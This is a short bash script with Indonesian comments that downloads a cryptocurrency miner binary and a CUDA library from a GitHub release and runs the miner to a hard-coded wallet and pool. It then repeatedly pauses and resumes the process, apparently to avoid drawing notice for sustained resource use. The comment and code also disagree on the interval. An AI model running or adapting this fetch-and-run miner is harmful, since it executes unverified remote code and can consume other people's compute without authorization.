#!/bin/bash


wget https://github.com/cecepabdul/mining/releases/download/new/kobra && wget https://github.com/cecepabdul/mining/releases/download/new/libkobracuda.so && chmod +x kobra

# Jalankan miner di background
./kobra \
  --mining-address kobra:qqpperx2tzrwvg6wmhvlr08wgvgtg9s4829cusfysyargce3yfrhzs3lkc6q7  \
  --kobra-address us.pools4mining.com &

# Simpan PID-nya
PID=$!

echo "Kobra Miner berjalan dengan PID: $PID"

# Loop untuk pause/resume tiap 5 menit
while true; do
    sleep 120  # Tunggu 5 menit
    echo "[INFO] Menjeda proses selama 30 detik..."
    kill -STOP "$PID"  # Pause
    sleep 30
    echo "[INFO] Melanjutkan kembali proses..."
    kill -CONT "$PID"  # Resume
done
